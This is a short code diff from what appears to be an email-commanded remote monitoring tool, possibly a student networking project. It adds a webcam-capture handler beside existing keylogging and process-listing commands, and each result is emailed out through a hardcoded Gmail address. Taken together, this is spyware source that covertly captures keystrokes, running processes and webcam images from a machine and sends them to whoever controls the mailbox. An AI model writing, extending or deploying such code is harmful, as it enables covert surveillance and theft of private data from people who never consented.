@@ -3,6 +3,7 @@ import SendEmail
 import ListProcesses
 import keylogger
 from time import time, sleep
+import WebcamCapture
 
 client_address = "client1.computernetwork@gmail.com"
 
@@ -16,8 +17,8 @@ def Handling(subject):
     if subject == 'List Processes':
         content = ListProcesses.ListProcesses()
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
-    elif subject == "demo send picture":
-        content = "test.jpg"
+    elif subject == "Webcam Capture":
+        content = WebcamCapture.CapturePath
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'image')
     elif subject == "Start Key Logging":
         thread = keylogger.StartLogging()
@@ -42,6 +43,7 @@ def main():
         # break
         # Handling("demo send picture")
         # break
+
 
 #======================================================
 
